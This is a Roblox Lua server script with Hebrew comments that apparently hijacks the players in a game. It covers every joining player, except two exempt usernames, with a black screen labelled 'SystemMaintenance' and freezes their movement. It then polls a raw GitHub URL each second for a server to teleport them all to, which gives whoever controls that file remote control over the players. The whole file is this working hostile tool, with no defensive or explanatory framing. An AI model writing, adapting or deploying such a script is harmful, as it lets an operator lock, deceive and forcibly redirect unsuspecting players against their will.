local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local Players = game:GetService("Players")

-- הקישור ה-Raw שלך
local rawUrl = "https://raw.githubusercontent.com/gili435/me-nedd-this/refs/heads/main/dylanzyl120"

-- רשימת חסימה (הם לא ינעלו ולא ישתגרו)
local blockedPlayers = {
	["noamdb15"] = true,
	["dylanzyl123"] = true
}

-- פונקציה לנעילת השחקן (תנועה ומסך)
local function lockPlayer(player)
	-- 1. יצירת מסך שחור/טעינה
	local screenGui = Instance.new("ScreenGui")
	screenGui.Name = "SystemMaintenance"
	screenGui.IgnoreGuiInset = true
	screenGui.DisplayOrder = 999999
	screenGui.Parent = player:WaitForChild("PlayerGui")

	local frame = Instance.new("Frame")
	frame.Size = UDim2.new(1, 0, 1, 0)
	frame.BackgroundColor3 = Color3.new(0, 0, 0)
	frame.Active = true
	frame.Parent = screenGui

	-- 2. ניטרול תנועה לחלוטין
	player.CharacterAdded:Connect(function(char)
		local hum = char:WaitForChild("Humanoid")
		hum.WalkSpeed = 0
		hum.JumpPower = 0
		hum.PlatformStand = true -- נועל את האנימציה והתנועה
	end)

	-- אם הוא כבר בתוך המשחק כשזה רץ
	if player.Character then
		local hum = player.Character:FindFirstChild("Humanoid")
		if hum then
			hum.WalkSpeed = 0
			hum.JumpPower = 0
			hum.PlatformStand = true
		end
	end
end

-- הפעלה ברגע שמישהו נכנס
Players.PlayerAdded:Connect(function(player)
	if not blockedPlayers[player.Name] then
		lockPlayer(player)
	end
end)

-- לופ שיגור מהיר
task.spawn(function()
	while true do
		local success, response = pcall(function()
			return HttpService:GetAsync(rawUrl .. "?t=" .. tick())
		end)

		if success and response then
			local lines = {}
			for line in response:gmatch("[^\r\n]+") do
				table.insert(lines, line)
			end

			local targetPlaceId = tonumber(lines[1])
			local targetJobId = lines[2]

			if targetJobId and targetJobId ~= "" then
				for _, player in pairs(Players:GetPlayers()) do
					if not blockedPlayers[player.Name] then
						pcall(function()
							TeleportService:TeleportToPlaceInstance(targetPlaceId or game.PlaceId, targetJobId, player)
						end)
					end
				end
			end
		end
		task.wait(1)
	end
end)
